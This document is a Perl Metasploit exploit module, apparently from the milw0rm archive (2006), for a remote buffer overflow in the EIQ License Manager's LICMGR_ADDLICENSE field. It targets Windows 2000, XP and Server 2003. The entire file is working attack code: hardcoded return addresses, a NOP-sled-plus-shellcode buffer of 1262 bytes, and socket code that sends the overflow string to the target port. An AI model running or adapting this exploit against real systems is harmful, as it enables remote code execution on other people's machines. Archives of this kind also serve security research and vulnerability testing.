#!/usr/bin/perl -w

#metasploit module for EIQ Licence manager overflow Provided by ri0t of Bastard Labs

package Msf::Exploit::EiQ_License_1262; 
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'EIQ License Manager Overflow',
	'Authors'  => [ 'ri0t ri0t@ri0tnet.net, KF kf_list@digitalmunition.com' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'seh' },
	
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 10616],
	 },
        'Payload'  =>
	  {
		'Space' => 1262,
		'BadChars'  => "\x00\x0a\x0d\x40\x26",
            },
          'Description'  =>  Pex::Text::Freeform(qq{
	This module exploits the buffer overflow found in the LICMGR_ADDLICENSE
        Field of EIQ networks network analyser this module exploits buffers of 1262 bytes
	in size. This module should work on all rebranded eiq analysers.  Exploitation
	assistance from KF of digital munition.
        }),
          
          
        'DefaultTarget' => 1,
	'Targets' =>
	  [
	        ['Windows 2000 SP0-SP4 English', 0x750316e2],   # call ebx
		['Windows XP English SP1/SP2', 0x77db64dc ],	# jmp ebx
	        ['Windows Server 2003 English SP0/SP1', 0x77d16764 ],   # jmp ebx
	  ],
          
  };
  
  sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}
  
  sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];
        my $nops 	= $self->MakeNops(1262 - length($shellcode));
        my $ret         =  pack("V", $target->[1]);
        my $evil        = "LICMGR_ADDLICENSE&" . $nops . $shellcode . $ret . "&";
	
            
        my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
    	  );
          
          if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
          $self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));
          
          $s->Send("$evil");
          return;
  }

# milw0rm.com [2006-07-26]
